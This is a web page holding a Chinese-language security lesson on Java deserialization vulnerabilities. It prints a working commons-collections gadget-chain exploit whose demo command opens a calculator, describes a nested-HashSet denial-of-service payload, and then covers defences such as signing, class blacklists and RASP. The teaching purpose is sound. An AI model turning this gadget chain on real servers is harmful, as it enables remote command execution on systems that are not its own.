<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>09_反序列化漏洞：使用了编译型语言，为什么还是会被注入？ - Docs</title>
  <meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>

<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />

<meta name="theme-color" content="#f8f5ec" />
<meta name="msapplication-navbutton-color" content="#f8f5ec">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">


<meta name="author" content="" /><meta name="description" content="你好，我是何为舟。
我们都知道，Java 是一种高层级的语言。在 Java 中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java 是一种先编译再执行的语言，无法像 JavaScript 那样随时插入一段代码。因此，很多人会认为，Java 是一个安全的语言。如果使用 Java 开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java 真的这么安全吗？
" /><meta name="keywords" content="技术文档, docs, 极客时间" />






<meta name="generator" content="Hugo 0.140.2 with theme even" />


<link rel="canonical" href="https://politcloud.org/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/09_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BD%BF%E7%94%A8%E4%BA%86%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%98%E6%98%AF%E4%BC%9A%E8%A2%AB%E6%B3%A8%E5%85%A5/" />
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">



<link href="/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">


<meta property="og:url" content="https://politcloud.org/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/09_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%BD%BF%E7%94%A8%E4%BA%86%E7%BC%96%E8%AF%91%E5%9E%8B%E8%AF%AD%E8%A8%80%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%98%E6%98%AF%E4%BC%9A%E8%A2%AB%E6%B3%A8%E5%85%A5/">
  <meta property="og:site_name" content="Docs">
  <meta property="og:title" content="09_反序列化漏洞：使用了编译型语言，为什么还是会被注入？">
  <meta property="og:description" content="你好，我是何为舟。
我们都知道，Java 是一种高层级的语言。在 Java 中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java 是一种先编译再执行的语言，无法像 JavaScript 那样随时插入一段代码。因此，很多人会认为，Java 是一个安全的语言。如果使用 Java 开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java 真的这么安全吗？">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2024-01-10T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-01-10T00:00:00+00:00">
    <meta property="article:tag" content="安全攻防技能30讲">

  <meta itemprop="name" content="09_反序列化漏洞：使用了编译型语言，为什么还是会被注入？">
  <meta itemprop="description" content="你好，我是何为舟。
我们都知道，Java 是一种高层级的语言。在 Java 中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java 是一种先编译再执行的语言，无法像 JavaScript 那样随时插入一段代码。因此，很多人会认为，Java 是一个安全的语言。如果使用 Java 开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java 真的这么安全吗？">
  <meta itemprop="datePublished" content="2024-01-10T00:00:00+00:00">
  <meta itemprop="dateModified" content="2024-01-10T00:00:00+00:00">
  <meta itemprop="wordCount" content="5509">
  <meta itemprop="keywords" content="安全攻防技能30讲">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="09_反序列化漏洞：使用了编译型语言，为什么还是会被注入？">
  <meta name="twitter:description" content="你好，我是何为舟。
我们都知道，Java 是一种高层级的语言。在 Java 中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java 是一种先编译再执行的语言，无法像 JavaScript 那样随时插入一段代码。因此，很多人会认为，Java 是一个安全的语言。如果使用 Java 开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java 真的这么安全吗？">

<!--[if lte IE 9]>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
<![endif]-->

<!--[if lt IE 9]>
  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
<![endif]-->

</head>
<body>
  <div id="mobile-navbar" class="mobile-navbar">
  <div class="mobile-header-logo">
    <a href="/" class="logo">Docs</a>
  </div>
  <div class="mobile-navbar-icon">
    <span></span>
    <span></span>
    <span></span>
  </div>
</div>
<nav id="mobile-menu" class="mobile-menu slideout-menu">
  <ul class="mobile-menu-list">
    <a href="/">
        <li class="mobile-menu-item">Home</li>
      </a><a href="/post/">
        <li class="mobile-menu-item">Archives</li>
      </a><a href="/tags/">
        <li class="mobile-menu-item">Tags</li>
      </a><a href="/categories/">
        <li class="mobile-menu-item">Categories</li>
      </a>
  </ul>

  


</nav>

  <div class="container" id="mobile-panel">
    <header id="header" class="header">
        <div class="logo-wrapper">
  <a href="/" class="logo">Docs</a>
</div>





<nav class="site-navbar">
  <ul id="menu" class="menu">
    <li class="menu-item">
        <a class="menu-item-link" href="/">Home</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/post/">Archives</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/tags/">Tags</a>
      </li><li class="menu-item">
        <a class="menu-item-link" href="/categories/">Categories</a>
      </li>
  </ul>
</nav>

    </header>

    <main id="main" class="main">
      <div class="content-wrapper">
        <div id="content" class="content">
          <article class="post">
    
    <header class="post-header">
      <h1 class="post-title">09_反序列化漏洞：使用了编译型语言，为什么还是会被注入？</h1>

      <div class="post-meta">
        <span class="post-time"> 10100-01-10 </span>
        <div class="post-category">
            <a href="/categories/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/"> 极客时间 </a>
            </div>
          <span class="more-meta"> 约 5509 字 </span>
          <span class="more-meta"> 预计阅读 11 分钟 </span>
        
      </div>
    </header>

    <div class="post-toc" id="post-toc">
  <h2 class="post-toc-title">文章目录</h2>
  <div class="post-toc-content">
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#反序列化漏洞是如何产生的">反序列化漏洞是如何产生的？</a></li>
        <li><a href="#通过反序列化漏洞黑客能做什么">通过反序列化漏洞，黑客能做什么？</a></li>
        <li><a href="#如何进行反序列化漏洞防护">如何进行反序列化漏洞防护？</a>
          <ul>
            <li><a href="#1-认证和签名">1. 认证和签名</a></li>
            <li><a href="#2-限制序列化和反序列化的类">2. 限制序列化和反序列化的类</a></li>
            <li><a href="#3rasp-检测">3.RASP 检测</a></li>
          </ul>
        </li>
        <li><a href="#总结">总结</a></li>
        <li><a href="#思考题">思考题</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</div>
    <div class="post-content">
      <p>你好，我是何为舟。</p>
<p>我们都知道，Java 是一种高层级的语言。在 Java 中，你不需要直接操控内存，大部分的服务和组件都已经有了成熟的封装。除此之外，Java 是一种先编译再执行的语言，无法像 JavaScript 那样随时插入一段代码。因此，很多人会认为，Java 是一个安全的语言。如果使用 Java 开发服务，我们只需要考虑逻辑层的安全问题即可。但是，Java 真的这么安全吗？</p>
<p>2015 年，Java 曾被曝出一个严重的漏洞，很多经典的商业框架都因此受到影响，其中最知名的是WebLogic。据统计，在网络中公开的 WebLogic 服务有 3 万多个。其中，中国就有 1 万多个外网可访问的 WebLogic 服务。因此，WebLogic 的反序列化漏洞意味着，国内有 1 万多台服务器可能会被黑客攻陷，其影响的用户数量更是不可估量的。</p>
<p>你可能要说了，我实际工作中并没有遇到过反序列化漏洞啊。但是，你一定使用过一些序列化和反序列化的工具，比如 Fastjson 和 Jackson 等。如果你关注这些工具的版本更新，就会发现，这些版本更新中包含很多修复反序列化漏洞的改动。而了解反序列化漏洞，可以让你理解，Java 作为一种先打包后执行的语言，是如何被插入额外逻辑的；也能够让你对 Java 这门语言的安全性，有一个更全面的认知。</p>
<p>那么，到底什么是反序列化漏洞呢？它究竟会对 Java 的安全带来哪些冲击呢？遇到这些冲击，我们该怎么办呢？今天我就带你来了解反序列化漏洞，然后一起学习如何防护这样的攻击！</p>
<h2 id="反序列化漏洞是如何产生的">反序列化漏洞是如何产生的？</h2>
<p>如果你是研发人员，工作中一定会涉及很多的序列化和反序列化操作。应用在输出某个数据的时候，将对象转化成字符串或者字节流，这就是序列化操作。那什么是反序列化呢？没错，我们把这个过程反过来，就是反序列化操作，也就是应用将字符串或者字节流变成对象。</p>
<p>序列化和反序列化有很多种实现方式。比如 Java 中的 Serializable 接口（或者 Python 中的 pickle）可以把应用中的对象转化为二进制的字节流，把字节流再还原为对象；还有 XML 和 JSON 这些跨平台的协议，可以把对象转化为带格式的文本，把文本再还原为对象。</p>
<p>那反序列化漏洞到底是怎么产生的呢？问题就出在把数据转化成对象的过程中。在这个过程中，应用需要根据数据的内容，去调用特定的方法。而黑客正是利用这个逻辑，在数据中嵌入自定义的代码（比如执行某个系统命令）。应用对数据进行反序列化的时候，会执行这段代码，从而使得黑客能够控制整个应用及服务器。这就是反序列化漏洞攻击的过程。</p>
<p>事实上，基本上所有语言都会涉及反序列化漏洞。其中，Java 因为使用范围比较广，本身体积也比较庞大，所以被曝出的反序列化漏洞最多。下面，我就以 Java 中一个经典的反序列化漏洞 demo ysoserial 为基础，来介绍一个经典的反序列化漏洞案例，给你讲明白反序列化漏洞具体的产生过程。了解漏洞是怎么产生的，对于你后面理解防护措施也会非常有帮助，所以这里你一定要认真看。</p>
<p>不过，这里也先提醒你一下，这块原理的内容相对比较复杂。我会尽量给你讲解清楚，讲完之后，我也会带着你对这部分内容进行总结、复习。重复记忆可以加深理解，这块内容建议你可以多看几遍。好了，下面我们就来看这个案例！</p>
<p>最终的演示 demo 的代码如下所示。在 macOS 环境下运行这段代码，你就能够打开一个计算器。（在 Windows 环境下，将系统命令 open -a calculator 修改成 calc 即可。）注意，这里需要依赖 3.2.1 以下的 commons-collections，最新的版本已经对这个漏洞进行了修复，所以无法重现这个攻击的过程。</p>
<p>public class Deserialize {<br>
public static void main(String&hellip; args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchMethodException {<br>
Object evilObject = getEvilObject();<br>
byte[] serializedObject = serializeToByteArray(evilObject);<br>
deserializeFromByteArray(serializedObject);<br>
}</p>
<pre><code>public static Object getEvilObject() throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {  
    String[] command = {&quot;open -a calculator&quot;};  

    final Transformer[] transformers = new Transformer[]{  
            new ConstantTransformer(Runtime.class),  
            new InvokerTransformer(&quot;getMethod&quot;,  
                    new Class[]{String.class, Class[].class},  
                    new Object[]{&quot;getRuntime&quot;, new Class[0]}  
            ),  
            new InvokerTransformer(&quot;invoke&quot;,  
                    new Class[]{Object.class, Object[].class},  
                    new Object[]{null, new Object[0]}  
            ),  
            new InvokerTransformer(&quot;exec&quot;,  
                    new Class[]{String.class},  
                    command  
            )  
    };  

    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  

    Map map = new HashMap&lt;&gt;();  
    Map lazyMap = LazyMap.decorate(map, chainedTransformer);  

    String classToSerialize = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;  
    final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];  
    constructor.setAccessible(true);  
    InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);  
    Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Deserialize.class.getClassLoader(), new Class[]{Map.class}, secondInvocationHandler);  

    InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);  

    return invocationHandlerToSerialize;  

    /*Transformer[] transformers = new Transformer[] {  
            new ConstantTransformer(Runtime.class),  
            new InvokerTransformer(&quot;getMethod&quot;, new Class[] {  
                    String.class, Class[].class }, new Object[] {  
                    &quot;getRuntime&quot;, new Class[0] }),  
            new InvokerTransformer(&quot;invoke&quot;, new Class[] {  
                    Object.class, Object[].class }, new Object[] {  
                    null, new Object[0] }),  
            new InvokerTransformer(&quot;exec&quot;, new Class[] {  
                    String.class }, new Object[] {&quot;open -a calculator&quot;})};  

    Transformer chain = new ChainedTransformer(transformers);  
    Map innerMap = new HashMap&lt;String, Object&gt;();  
    innerMap.put(&quot;key&quot;, &quot;value&quot;);  
    Map&lt;String, Object&gt; outerMap = TransformedMap.decorate(innerMap, null, chain);  
    Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  
    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);  
    ctor.setAccessible(true);  
    Object instance = ctor.newInstance(Target.class, outerMap);  
    return instance;*/  
}  

public static void deserializeAndDoNothing(byte[] byteArray) throws IOException, ClassNotFoundException {  
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray));  
    ois.readObject();  
}  

public static byte[] serializeToByteArray(Object object) throws IOException {  
    ByteArrayOutputStream serializedObjectOutputContainer = new ByteArrayOutputStream();  
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(serializedObjectOutputContainer);  
    objectOutputStream.writeObject(object);  
    return serializedObjectOutputContainer.toByteArray();  
}  

public static Object deserializeFromByteArray(byte[] serializedObject) throws IOException, ClassNotFoundException {  
    ByteArrayInputStream serializedObjectInputContainer = new ByteArrayInputStream(serializedObject);  
    ObjectInputStream objectInputStream = new ObjectInputStream(serializedObjectInputContainer);  
    InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();  
    return evilInvocationHandler;  
}  
</code></pre>
<p>}</p>
<p>下面我们来分析一下这段代码的逻辑。</p>
<p>在 Java 通过<code>ObjectInputStream.readObject()</code>进行反序列化操作的时候，ObjectInputStream 会根据序列化数据寻找对应的实现类（在 payload 中是<code>sun.reflect.annotation.AnnotationInvocationHandler</code>）。如果实现类存在，Java 就会调用其 readObject 方法。因此，<code>AnnotationInvocationHandler.readObject</code>方法在反序列化过程中会被调用。</p>
<p><code>AnnotationInvocationHandler 在 readObject</code>的过程中会调用<code>streamVals.entrySet()</code>。其中，<code>streamVals</code>是<code>AnnotationInvocationHandler</code>构造函数中的第二个参数。这个参数可以在数据中进行指定。而黑客定义的是 Proxy 类，也就是说，黑客会让这个参数的实际值等于 Proxy。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/35e7ecd4d50bb48097cbbaf6b21dbf7d.png" alt=""></p>
<p>Proxy 是动态代理，它会基于 Java 反射机制去动态实现代理类的功能。在 Java 中，调用一个 Proxy 类的 entrySet() 方法，实际上就是在调用<code>InvocationHandler 中的 invoke</code>方法。在 invoke 方法中，Java 又会调用<code>memberValues.get(member)</code>。其中，<code>memberValues</code>是<code>AnnotationInvocationHandler</code>构造函数中的第二个参数。</p>
<p>同样地，<code>memberValues</code>这个参数也能够在数据中进行指定，而这次黑客定义的就是 LazyMap 类。member 是方法名，也就是 entrySet。因此，我们最终会调用到<code>LazyMap.get(&quot;entrySet&quot;)</code>这个逻辑。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/8d82d5bbe120a3c4d3bafcf93ae1c14f.png" alt=""></p>
<p>当 LazyMap 需要 get 某个参数的时候，如果之前没有获取过，则会调用<code>ChainedTransformer.transform</code>进行构造。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/4386882082405aff0a4a44ed8db8c842.png" alt=""></p>
<p><code>ChainedTransformer.transform</code>会将我们构造的几个 InvokerTransformer 顺次执行。而在<code>InvokerTransformer.transform</code>中，它会通过反射的方法，顺次执行我们定义好的 Java 语句，最终调用<code>Runtime.getRuntime().exec(&quot;open -a calculator&quot;)</code>实现命令执行的功能。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/e65c8c5e565614aa5447758f4f42b20c.png" alt=""></p>
<p>好了，讲了这么多，不知道你理解了多少？这个过程的确比较烧脑。我带你再来总结一下，简单来说，其实就是以下 4 步：</p>
<ol>
<li>黑客构造一个恶意的<strong>调用链</strong>（专业术语为 POP，Property Oriented Programming），并将其序列化成数据，然后发送给应用；</li>
<li>应用接收数据。大部分应用都有接收外部输入的地方，比如各种 HTTP 接口。而这个输入的数据就有可能是序列化数据；</li>
<li>应用进行反序列操作。收到数据后，应用尝试将数据构造成对象；</li>
<li>应用在反序列化过程中，会调用黑客构造的调用链，使得应用会执行黑客的任意命令。</li>
</ol>
<p>那么，在这个反序列化的过程中，应用为什么会执行黑客构造的调用链呢？这是因为，<strong>反序列化的过程其实就是一个数据到对象的过程</strong>。在这个过程中，应用必须根据数据源去调用一些默认方法（比如构造函数和 Getter/Setter）。</p>
<p>除了这些方法，反序列化的过程中，还会涉及一些接口类或者基类（简单的如：Map、List 和 Object）。应用也必须根据数据源，去判断选择哪一个具体的接口实现类。也就是说，黑客可以控制反序列化过程中，应用要调用的接口实现类的默认方法。通过对不同接口类的默认方法进行组合，黑客就可以控制反序列化的调用过程，实现执行任意命令的功能。</p>
<h2 id="通过反序列化漏洞黑客能做什么">通过反序列化漏洞，黑客能做什么？</h2>
<p>学习了前面的例子，我们已经知道，通过反序列化漏洞，黑客可以调用到<code>Runtime.exec()</code>来进行命令执行。换一句话说，黑客已经能够在服务器上执行任意的命令，这就相当于间接掌控了你的服务器，能够干任何他想干的事情了。</p>
<p>即使你对服务器进行了一定的安全防护，控制了黑客掌控服务器所产生的影响，黑客还是能够利用反序列化漏洞，来发起拒绝服务攻击。比如，曾经有人就提出过这样的方式，通过 HashSet 的相互引用，构造出一个 100 层的 HashSet，其中包含 200 个 HashSet 的实例和 100 个 String，结构如下图所示。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/13972862eb18a3bd02287930deb00cbe.png" alt=""></p>
<p>对于多层嵌套的对象，Java 在反序列化过程中，需要调用的方法呈指数增加。因此，尽管这个序列化的数组大概只有 6KB，但是面对这种 100 层的数据，Java 所需要执行的方法数是近乎无穷的（n 的 100 次方）。也就是说，黑客可以通过构建一个体积很小的数据，增加应用在反序列化过程中需要调用的方法数，以此来耗尽 CPU 资源，达到影响服务器可用性的目的。</p>
<h2 id="如何进行反序列化漏洞防护">如何进行反序列化漏洞防护？</h2>
<p>现在，你应该对序列化和反序列化的操作产生了一些警惕。那你可能要问了，既然反序列化漏洞危害这么大，我们能不能直接剔除它们呢？显然是不可能的，尤其是 JSON，作为目前最热门的跨平台数据交换格式之一，其易用性是显而易见的，你不可能因为这些还没发生的危害就剔除它们。因此，我们要采取一些有效的手段，在把反序列化操作的优势发挥出来的同时，去避免反序列化漏洞的出现。我们来看 3 种具体的防护方法：认证、限制类和 RASP 检测。</p>
<h3 id="1-认证和签名">1. 认证和签名</h3>
<p>首先，最简单的，我们可以通过认证，来避免应用接受黑客的异常输入。要知道，很多序列化和反序列化的服务并不是提供给用户的，而是提供给服务自身的。比如，存储一个对象到硬盘、发送一个对象到另外一个服务中去。对于这些点对点的服务，我们可以通过加入签名的方式来进行防护。比如，对存储的数据进行签名，以此对调用来源进行身份校验。只要黑客获取不到密钥信息，它就无法向进行反序列化的服务接口发送数据，也就无从发起反序列化攻击了。</p>
<h3 id="2-限制序列化和反序列化的类">2. 限制序列化和反序列化的类</h3>
<p>事实上，认证只是隐藏了反序列化漏洞，并没有真正修复它。那么，我们该如何从根本上去修复或者避免反序列化漏洞呢？</p>
<p>在反序列化漏洞中，黑客需要构建调用链，而调用链是基于类的默认方法来构造的。然而，大部分类的默认方法逻辑很少，无法串联成完整调用链。因此，在调用链中通常会涉及非常规的类，比如，刚才那个 demo 中的 InvokerTransformer。我相信 99.99% 的人都不会去序列化这个类。因此，我们可以通过构建黑名单的方式，来检测反序列化过程中调用链的异常。</p>
<p>在 Fastjson 的配置文件中，就维护了一个黑名单的列表，其中包括了很多可能执行代码的方法类。这些类都是平常会使用，但不会序列化的一些工具类，因此我们可以将它们纳入到黑名单中，不允许应用反序列化这些类（在最新的版本中，已经更改为 hashcode 的形式）。</p>
<p>我们在日常使用 Fastjson 或者其他 JSON 转化工具的过程中，需要注意避免序列化和反序列化接口类。这就相当于白名单的过滤：只允许某些类可以被反序列化。我认为，只要你在反序列化的过程中，避免了所有的接口类（包括类成员中的接口、泛型等），黑客其实就没有办法控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就无法利用反序列化漏洞了。</p>
<h3 id="3rasp-检测">3.RASP 检测</h3>
<p>通常来说，我们可以依靠第三方插件中自带的黑名单来提高安全性。但是，如果我们使用的是 Java 自带的序列化和反序列化功能（比如<code>ObjectInputStream.resolveClass</code>），那我们该怎么防护反序列化漏洞呢？如果我们想要替这些方法实现黑名单的检测，就会涉及原生代码的修改，这显然是一件比较困难的事。</p>
<p>为此，业内推出了 RASP（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截。关于 RASP，之后的课程中我们会专门进行讲解，这里暂时不深入了。简单来说，通过 RASP，我们就能够检测到应用中的非正常代码执行操作。</p>
<p><strong>我个人认为，</strong> <strong>RASP</strong> <strong>是最好的检测反序列化攻击的方式。</strong> 我为什么会这么说呢？这是因为，如果使用认证和限制类这样的方式来检测，就需要一个一个去覆盖可能出现的漏洞点，非常耗费时间和精力。而 RASP 则不同，它通过 hook 的方式，直接将整个应用都监控了起来。因此，能够做到覆盖面更广、代码改动更少。</p>
<p>但是，因为 RASP 会 hook 应用，相当于是介入到了应用的正常流程中。而 RASP 的检测规则都不高效，因此，它会给应用带来一定的性能损耗，不适合在高并发的场景中使用。但是，在应用不受严格性能约束的情况下，我还是更推荐使用 RASP。这样，开发就不用一个一个去对漏洞点进行手动修补了。</p>
<h2 id="总结">总结</h2>
<p>好了，今天的内容讲完了。我们来一起总结回顾一下，你需要掌握的重点内容。</p>
<p>我们首先讲了反序列化漏洞的产生原理，即黑客通过构造恶意的序列化数据，从而控制应用在反序列化过程中需要调用的类方法，最终实现任意方法调用。如果在这些方法中有命令执行的方法，黑客就可以在服务器上执行任意的命令。</p>
<p>对于反序列化漏洞的防御，我们主要考虑两个方面：认证和检测。对于面向内部的接口和服务，我们可以采取认证的方式，杜绝它们被黑客利用的可能。另外，我们也需要对反序列化数据中的调用链进行黑白名单检测。成熟的第三方序列化插件都已经包含了这个功能，暂时可以不需要考虑。最后，如果没有过多的性能考量，我们可以通过 RASP 的方式，来进行一个更全面的检测和防护。</p>
<p>最后，为了方便你记忆，我把今天的内容总结了一张知识脑图，你可以通过它对今天的重点内容进行复习巩固。</p>
<p><img src="https://raw.githubusercontent.com/epic1268/images/master/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/7983abfdaae75cff8e791a8c7210bd26.png" alt=""></p>
<h2 id="思考题">思考题</h2>
<p>最后，给你留一个思考题。</p>
<p>你可以去了解一下，你所使用的序列化和反序列化插件（比如 Fastjson、Gson 和 Jackson 等），是否被曝出过反序列化漏洞？然后结合今天的内容思考一下，这些反序列化漏洞，可能会给你带来什么影响。</p>
<p>欢迎留言和我分享你的思考和疑惑，也欢迎你把文章分享给你的朋友。我们下一讲再见！</p>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content"></span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        10100-01-10
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E8%83%BD30%E8%AE%B2/">安全攻防技能30讲</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80%E8%AF%BE/09_%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%8A%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E7%BC%96%E8%BE%91%E8%B7%9D%E7%A6%BB%E7%9A%84%E6%9F%A5%E8%AF%A2%E6%8E%A8%E8%8D%90/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">09_动态规划（上）：如何实现基于编辑距离的查询推荐？</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        <a class="next" href="/post/%E6%9E%81%E5%AE%A2%E6%97%B6%E9%97%B4/linux%E5%86%85%E6%A0%B8%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98%E8%AF%BE/09_%E5%88%86%E6%9E%90%E7%AF%87__%E5%A6%82%E4%BD%95%E5%AF%B9%E5%86%85%E6%A0%B8%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E5%81%9A%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%86%E6%9E%90/">
            <span class="next-text nav-default">09_分析篇__如何对内核内存泄漏做些基础的分析？</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
  
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2024 - 
    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  <script src="/lib/highlight/highlight.pack.js?v=20171001"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>


      <script async src="https://www.googletagmanager.com/gtag/js?id=G-FVZ07KBD4X"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-FVZ07KBD4X');
        }
      </script>






</body>
</html>
